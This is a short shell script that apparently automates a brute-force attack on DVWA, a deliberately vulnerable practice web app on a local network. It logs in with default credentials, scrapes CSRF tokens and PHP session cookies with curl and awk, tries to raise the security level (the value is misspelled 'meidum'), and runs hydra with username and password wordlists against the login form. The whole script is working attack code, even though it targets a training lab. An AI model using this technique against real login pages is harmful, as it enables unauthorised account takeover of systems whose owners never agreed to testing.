#Connect to the actual page for brute force
# curl -s -i -L 192.168.178.98/dvwa/vulnerabilities/brute/  > vuln
#
#Login with the found login
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to medium (impossible by default)
CSRFSEC=$(curl -s -i -L -c dvwa.cookie.medium -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie.medium | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie.medium -c dvwa.cookie.medium -d $"security=meidum&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "bruteforce" page
curl -s -i -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/brute/ > vuln
#Get new CSRF, Send our known login
CSRFMED=$(cat vuln | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDMED=$(grep PHPSESSID dvwa.cookie.medium | awk -F ' ' '{print $7}')
rm hydra.restore
hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -d -u -F -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRFMED}:F=Content-Length\: 4945:H=Cookie\: security=medium; PHPSESSID=${SESSIONIDMED}"
cat dvwa.cookie.medium
